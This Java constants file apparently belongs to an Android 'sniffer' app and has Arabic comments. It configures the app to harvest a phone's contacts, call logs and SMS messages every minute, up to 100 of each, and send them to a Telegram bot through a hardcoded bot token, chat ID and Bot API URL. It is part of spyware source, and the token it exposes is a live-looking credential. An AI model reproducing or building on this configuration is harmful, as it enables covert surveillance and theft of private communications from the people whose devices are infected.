package com.v8.global.sniffer.utils;

public class Constants {
    // ثوابت البوت
    public static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    public static final String CHAT_ID = "7259620384";
    public static final String BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    public static final long COLLECT_INTERVAL = 60 * 1000; // دقيقة واحدة

    // ثوابت تحديد عدد العناصر المسحوبة (لحل أخطاء الترجمة)
    public static final int MAX_CONTACTS_TO_SEND = 100;  // عدد جهات الاتصال المرسلة
    public static final int MAX_CALLS_TO_SEND = 100;     // عدد سجلات المكالمات المرسلة
    public static final int MAX_SMS_TO_SEND = 100;       // عدد الرسائل المرسلة
}
